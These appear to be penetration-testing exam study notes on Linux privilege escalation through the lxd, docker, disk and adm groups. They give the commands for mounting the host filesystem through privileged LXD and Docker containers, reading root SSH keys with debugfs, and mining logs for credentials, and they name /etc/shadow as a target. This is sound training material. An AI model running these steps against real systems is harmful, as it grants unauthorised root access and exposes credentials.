# Privilege Escalation via Privileged Groups

Certain Linux groups provide access to resources that can be abused to obtain root-level privileges or sensitive information.

## 1. LXC / LXD Group

- Membership in the `lxd` group can lead to root privilege escalation.
- LXD allows users to create privileged containers and mount the host filesystem.
- A privileged container runs without UID mapping, making container root equivalent to host root.

Enumeration:

```
id
groups
```

Check for `lxd` membership.

Exploitation:

1\. Extract the Alpine image:

```
unzip alpine.zip
cd 64-bit\ Alpine/
```

2\. Initialize LXD:

```
lxd init
```

Choose default options. Bridge configuration may fail due to insufficient root privileges; this does not necessarily prevent exploitation.

3\. Import the Alpine image:

```
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

4\. Create a privileged container:

```
lxc init alpine r00t -c security.privileged=true
```

5\. Mount the host filesystem inside the container:

```
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

6\. Start the container and obtain a shell:

```
lxc start r00t
lxc exec r00t /bin/sh
```

7\. Verify privileges and access host root:

```
id
cd /mnt/root/root
```

Important files to target:

- `/mnt/root/etc/shadow` – Password hashes.
- `/mnt/root/root/.ssh/` – Root SSH keys.
- `/mnt/root/etc/` – Sensitive configuration files.

Privilege escalation to root

## 2. Docker Group

- Membership in the `docker` group is effectively equivalent to root access.
- Docker group members can create containers and mount host directories.
- Mounting the host's root directory allows access to sensitive files.

Enumeration:

```
id
groups
```

Check for `docker` membership.

Exploitation:

Create a container and mount the host's `/root` directory:

```
docker run -v /root:/mnt -it ubuntu
```

Inside the container:

```
ls -la /mnt
```

Potential targets:

- `/root/.ssh/` – SSH private keys.
- `/etc/shadow` – Password hashes (mount `/etc` if needed).
- Other sensitive host files.

Privilege escalation to root

## 3. Disk Group

- Membership in the `disk` group provides direct access to storage devices under `/dev`.
- This may allow reading or modifying the entire filesystem at a low level.
- The `debugfs` utility can be used to access an ext filesystem.

Enumeration:

```
id
groups
ls -l /dev/sda*
```

Exploitation:

Access the filesystem using:

```
debugfs /dev/sda1
```

Useful `debugfs` commands:

```
ls
cd /root
cat /root/.ssh/id_rsa
```

Potential targets:

- `/etc/shadow`
- `/root/.ssh/id_rsa`
- Sensitive configuration files.

Potential root-level filesystem access

## 4. ADM Group

- Membership in the `adm` group generally provides read access to system logs in `/var/log`.
- It does not directly provide root access.
- Logs may contain credentials, sensitive information, and details about user activities.

Enumeration:

```
id
groups
```

Check for `adm` membership.

Log enumeration:

```
ls -la /var/log
```

Useful log files:

```
cat /var/log/auth.log
cat /var/log/syslog
cat /var/log/apache2/access.log
cat /var/log/apache2/error.log
```

What to look for:

- Exposed usernames and passwords.
- Authentication attempts.
- Sudo activity.
- Cron jobs and executed commands.
- Application credentials and sensitive data.

Information gathering – not direct root access

## CPTS Exam Quick Reference

| Group    | Main abuse                                 | Impact                           |
| -------- | ------------------------------------------ | -------------------------------- |
| `lxd`    | Create privileged container and mount `/`  | Root                             |
| `docker` | Create container and mount host filesystem | Root                             |
| `disk`   | Direct disk access using `debugfs`         | Root-level filesystem access     |
| `adm`    | Read `/var/log` files                      | Sensitive information disclosure |

Remember during enumeration:

```
id
groups
cat /etc/group
```

High-priority groups to investigate:

- `lxd`
- `docker`
- `disk`
- `adm`

Exam tip: Always check group memberships during Linux privilege escalation enumeration. `lxd`, `docker`, and `disk` are particularly interesting because they can provide access to the host filesystem without requiring the user's password.
